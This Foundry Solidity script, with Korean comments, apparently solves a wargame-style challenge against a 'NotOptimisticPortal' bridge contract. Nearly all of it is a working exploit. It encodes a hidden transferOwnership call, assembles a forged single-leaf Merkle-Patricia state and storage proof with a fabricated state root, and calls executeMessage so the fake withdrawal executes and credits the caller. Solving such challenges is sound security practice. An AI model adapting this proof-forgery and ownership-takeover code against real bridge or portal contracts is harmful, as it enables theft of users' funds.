// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script,console} from "forge-std/Script.sol";

import {INotOptimisticPortal} from "src/INotOptimisticPortal.sol";
import {Attacker} from "src/Attacker.sol";
import {RLP} from "src/RLP.sol";

contract AttackerScript is Script {

    INotOptimisticPortal constant target = INotOptimisticPortal(0xD9009B8D723c49E122bA2dd6B24B062e8B73fa7E); // 변동가능
    address public constant L2_TARGET = 0x4242424242424242424242424242424242424242;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker(target);

        // 단서1: 0x3a69197e 시그니처는 transferOwnership_____610165642(address)를 표현한다
        // => ownership 획득의 실마리
        address[] memory receivers = new address[](2);
        receivers[0] = address(target);
        receivers[1] = address(attacker);
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(target.transferOwnership_____610165642.selector, address(attacker));
        data[1] = abi.encodeWithSelector(Attacker.onMessageReceived.selector, hex"00");
        //target.sendMessage(100, receivers, data, 0);

        bytes32 withdrawalSlot = _computeMessageSlot(
            msg.sender,
            100,
            receivers,
            data,
            0
        );

        // 단서2: merkle proof 검증 전 L2 tx를 반영한다
        // => 틀린 tx여도 실행이 가능하다
        // => stateRoot가 실제 L2 상태와 일치할 필요가 없다는 가정하에,
        //    "L2_TARGET의 withdrawalSlot번째 슬롯 값 = 1" 하나만 담은
        //    자체 완결적인(self-consistent) 가짜 MPT 증명을 로컬에서 조립한다.
        (INotOptimisticPortal.ProofData memory proof, bytes32 forgedStorageRoot, bytes32 forgedStateRoot) =
            _buildForgedProof(withdrawalSlot);
        forgedStorageRoot;
        attacker.setStateRoot(forgedStateRoot);

        target.executeMessage(
            msg.sender,
            100,
            receivers,
            data,
            0,
            proof,
            1
        );

        console.log("my balance:", target.balanceOf(msg.sender));

        vm.stopBroadcast();
    }

    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;
        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
                messageDatasAccumulatedHash = keccak256(abi.encode(messageDatasAccumulatedHash, _messageDatas[i]));
            }
        }
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt
        ));
    }

    /// @notice L2_TARGET 계정 하나 + 그 계정의 storage 슬롯 하나(withdrawalSlot => 1)만 담긴
    ///         "엔트리 1개짜리" state trie / storage trie를 처음부터 끝까지 직접 구성한다.
    ///         엔트리가 하나뿐이므로 트라이 전체가 leaf 노드 1개로 붕괴하고,
    ///         그 leaf 노드의 해시가 곧 root가 된다 (실제 체인 상태 조회 불필요).
    /// @dev 가정: 검증 로직이 이 stateRoot를 신뢰 가능한 값과 대조하지 않는다 (단서2).
    ///      accountStateRlp의 nonce/balance/codeHash는 검증되지 않는다고 가정하고 더미값을 사용한다.
    function _buildForgedProof(bytes32 withdrawalSlot)
        internal
        pure
        returns (INotOptimisticPortal.ProofData memory proof, bytes32 storageRoot, bytes32 stateRoot)
    {
        // ---- 1) storage trie: {withdrawalSlot => 1} 단일 엔트리 ----
        // secure trie 규약: 실제 키가 아니라 keccak256(키)를 트라이 경로로 사용한다.
        bytes32 storageKeyHash = keccak256(abi.encodePacked(withdrawalSlot));
        bytes memory storedValueRlp = RLP.encodeUint(1); // 슬롯 값 1 (=> 0x01)
        bytes memory storageLeaf = _leafNode(storageKeyHash, storedValueRlp);
        storageRoot = keccak256(storageLeaf);

        bytes[] memory storageProofNodes = new bytes[](1);
        storageProofNodes[0] = RLP.encodeBytes(storageLeaf);
        proof.storageTrieProof = RLP.encodeList(storageProofNodes);

        // ---- 2) account state: [nonce, balance, storageRoot, codeHash] ----
        // storageRoot만 실제로 의미가 있고 나머지 필드는 검증되지 않는다는 전제하에 더미값을 채운다.
        bytes32 codeHash = keccak256(""); // EMPTY_CODE_HASH, 실제 L2_TARGET 바이트코드와 무관한 더미
        bytes[] memory accountFields = new bytes[](4);
        accountFields[0] = RLP.encodeUint(0); // nonce (더미)
        accountFields[1] = RLP.encodeUint(0); // balance (더미)
        accountFields[2] = RLP.encodeBytes(abi.encodePacked(storageRoot));
        accountFields[3] = RLP.encodeBytes(abi.encodePacked(codeHash));
        proof.accountStateRlp = RLP.encodeList(accountFields);

        // ---- 3) state trie: {L2_TARGET => accountStateRlp} 단일 엔트리 ----
        bytes32 accountKeyHash = keccak256(abi.encodePacked(L2_TARGET));
        bytes memory stateLeaf = _leafNode(accountKeyHash, proof.accountStateRlp);
        stateRoot = keccak256(stateLeaf); // *** 쓰레기 stateRoot: 실제 L2와 무관, 우리가 만든 트라이의 루트일 뿐 ***

        bytes[] memory stateProofNodes = new bytes[](1);
        stateProofNodes[0] = RLP.encodeBytes(stateLeaf);
        proof.stateTrieProof = RLP.encodeList(stateProofNodes);
    }

    /// @dev keccak256(key)를 경로로 하는 MPT leaf 노드를 만든다.
    ///      keccak256 출력은 항상 32바이트(=64니블, 짝수)이므로 hex-prefix 플래그는
    ///      "leaf + 짝수" 고정값 0x20이고, 그 뒤에 32바이트 키 해시가 그대로 붙는다.
    function _leafNode(bytes32 keyHash, bytes memory valueField) internal pure returns (bytes memory) {
        bytes[] memory items = new bytes[](2);
        items[0] = RLP.encodeBytes(abi.encodePacked(bytes1(0x20), keyHash));
        items[1] = RLP.encodeBytes(valueField);
        return RLP.encodeList(items);
    }
}
